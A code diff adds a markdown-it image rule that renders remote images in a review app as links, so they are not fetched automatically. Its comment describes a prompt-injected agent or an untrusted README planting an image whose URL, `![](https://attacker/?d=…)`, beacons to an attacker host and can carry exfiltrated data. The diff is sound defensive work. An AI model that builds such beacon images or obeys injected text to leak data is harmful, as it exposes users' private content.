@@ -73,6 +73,31 @@ md.renderer.rules.r3ref = (tokens, idx) => {
   );
 };
 
+// A URL the browser would fetch off-origin: anything carrying a scheme, plus
+// protocol-relative `//host/…`. `data:` makes no request (and markdown-it's
+// validateLink has already narrowed it to a few image types), so it stays.
+// Twin of the rule in server/highlight.ts, which renders file `.md` the same way.
+export const REMOTE_URL_RE = /^(?!data:)[a-z][a-z0-9+.-]*:|^\/\//i;
+
+// Images are the one Markdown construct that reaches the network with no click.
+// Both sides of this app render text we don't trust — a prompt-injected agent
+// writes feedback and replies, and a reviewed repo's README is someone else's
+// file — so `![](https://attacker/?d=…)` would beacon (and could carry
+// exfiltrated content in the query) the moment the human opens the review.
+// Render a remote image as the link it is and let the human decide to load it.
+const defaultImage =
+  md.renderer.rules.image ??
+  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options));
+md.renderer.rules.image = (tokens, idx, options, env, self) => {
+  const src = tokens[idx].attrGet("src") ?? "";
+  if (!REMOTE_URL_RE.test(src)) return defaultImage(tokens, idx, options, env, self);
+  const alt = self.renderInlineAsText(tokens[idx].children ?? [], options, env);
+  return (
+    `<a class="r3-remote-img" href="${escapeHtml(src)}" target="_blank" rel="noopener noreferrer"` +
+    ` title="Remote image — not loaded automatically">${escapeHtml(alt || src)}</a>`
+  );
+};
+
 // External links open in a new tab so a click never navigates the SPA away.
 const defaultLinkOpen =
   md.renderer.rules.link_open ??
